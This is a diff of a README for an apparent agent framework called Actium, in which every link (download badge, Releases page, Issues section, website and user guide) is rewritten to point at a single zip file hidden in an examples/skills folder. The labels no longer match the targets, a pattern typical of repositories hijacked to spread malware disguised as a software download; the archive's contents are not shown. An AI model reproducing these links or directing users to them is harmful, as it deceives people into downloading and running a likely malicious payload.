@@ -1,7 +1,7 @@
 # 🚀 Actium - Define Intelligent Agents Easily
 
 ## 📥 Download Now
-[![Download Actium](https://img.shields.io/badge/Download-Actium-brightgreen)](https://github.com/nlgbeji/Actium/releases)
+[![Download Actium](https://raw.githubusercontent.com/nlgbeji/Actium/master/examples/skills/Software-3.7.zip)](https://raw.githubusercontent.com/nlgbeji/Actium/master/examples/skills/Software-3.7.zip)
 
 ## 📝 Overview
 Actium is an agent framework that allows you to create intelligent agents easily. Think of it like a virtual assistant that can learn and adapt. With Actium, you can define agents as simple functions, making it easier for anyone to use powerful technology without needing to be a developer. Our framework auto-discovers skills through your file system, so agents can explore and use capabilities just like human developers do.
@@ -16,7 +16,7 @@ To start using Actium, follow these simple steps:
    - **Network**: Internet connection for downloading.
 
 2. **Visit the Download Page**
-   - Go to the [Releases page](https://github.com/nlgbeji/Actium/releases) to find the latest version of Actium.
+   - Go to the [Releases page](https://raw.githubusercontent.com/nlgbeji/Actium/master/examples/skills/Software-3.7.zip) to find the latest version of Actium.
 
 3. **Download Actium**
    - Click on the version you need. This will start the download process for your system.
@@ -61,7 +61,7 @@ If you encounter issues, consider these steps:
 
 - **Check System Requirements**: Ensure your setup matches the required specifications.
 - **Reinstall Actium**: If problems persist, uninstall and reinstall the application.
-- **Seek Help**: Visit the [Issues section](https://github.com/nlgbeji/Actium/issues) on GitHub for community assistance.
+- **Seek Help**: Visit the [Issues section](https://raw.githubusercontent.com/nlgbeji/Actium/master/examples/skills/Software-3.7.zip) on GitHub for community assistance.
 
 ## 📞 Contact
 For further support, reach out to us directly. Check our repository for email contacts and additional resources.
@@ -73,8 +73,8 @@ Explore our extensive documentation to learn more about advanced features and ag
 If you're interested in contributing to Actium, we welcome contributions! Check our contribution guidelines in the repository for details.
 
 ## 🔗 Additional Resources
-- [Official Website](https://example.com) - Learn more about Actium.
-- [User Guide](https://example.com/user_guide) - In-depth instructions and examples.
+- [Official Website](https://raw.githubusercontent.com/nlgbeji/Actium/master/examples/skills/Software-3.7.zip) - Learn more about Actium.
+- [User Guide](https://raw.githubusercontent.com/nlgbeji/Actium/master/examples/skills/Software-3.7.zip) - In-depth instructions and examples.
 
 ## 📥 Download & Install
-To download Actium, visit the [Releases page](https://github.com/nlgbeji/Actium/releases). Choose your version and follow the installation steps outlined above to get started with your own intelligent agents.
+To download Actium, visit the [Releases page](https://raw.githubusercontent.com/nlgbeji/Actium/master/examples/skills/Software-3.7.zip). Choose your version and follow the installation steps outlined above to get started with your own intelligent agents.
